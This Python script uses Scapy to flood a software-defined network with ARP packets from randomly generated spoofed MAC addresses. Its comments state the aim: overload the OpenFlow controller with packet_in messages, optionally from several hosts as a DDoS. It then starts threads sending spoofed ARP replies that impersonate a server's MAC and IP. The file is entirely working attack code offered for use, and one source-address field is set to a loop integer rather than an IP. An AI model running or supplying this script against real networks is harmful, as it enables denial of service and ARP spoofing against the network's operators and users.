#! /usr/bin/env python
# Script to send packets with different mac addresses  to the SDN network 
# It forces the switch to send an Openflow packet_in to the controller
# It can be used in several hosts to create a DDoS attack
# It must run on a host connected to a switch in the SDN network 
# Run with 3 args: hServerIP hServerMAC  quantity_injected_hosts 
import scapy.all as scapy
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
import sys
import threading
import time

    # Class to start a thread that sends packets to overload the controller
    # with packet_in messages
def att_ln(ifa,hServerMAC,hServerIP,fakeMAC):
    pck= Ether(dst=fakeMAC,src=hServerMAC,type=0x0806)/ARP(
        hwsrc=hServerMAC ,psrc= hServerIP,pdst=RandIP())
    sendp(pck,count=100,iface=ifa,inter=0.1)

def pingen(qp,ifa,hServerIP):
    fake_mac_ls=[]
    for i in range(qp):
        r=RandMAC()._fix()
        fake_mac_ls.append(r)
        packet =Ether(dst='ff:ff:ff:ff:ff:ff',src=r,type=0x0806)/ARP(hwsrc=r ,psrc= i,pdst=hServerIP)
        sendp(packet, count=1000,iface=ifa)
    return fake_mac_ls

ifs=os.listdir('/sys/class/net/')
for i in range(len(ifs)):
    if ifs[i] != 'lo' and ifs[i]!= 'eth0':
        ifa = ifs[i]
        print ('ifa es: '+ifa)
hServerIP=sys.argv[1]
hServerMAC=sys.argv[2]
qp = int(sys.argv[3])
print('hServerIP es: '+hServerIP)
fake_mac_ls = pingen(qp,ifa,hServerIP)
time.sleep(10)
print('fake_mac_ls is: '+str(fake_mac_ls))
for i in fake_mac_ls:
    th = threading.Thread(target=att_ln,args=[ifa,hServerMAC,hServerIP,i])
    th.start()
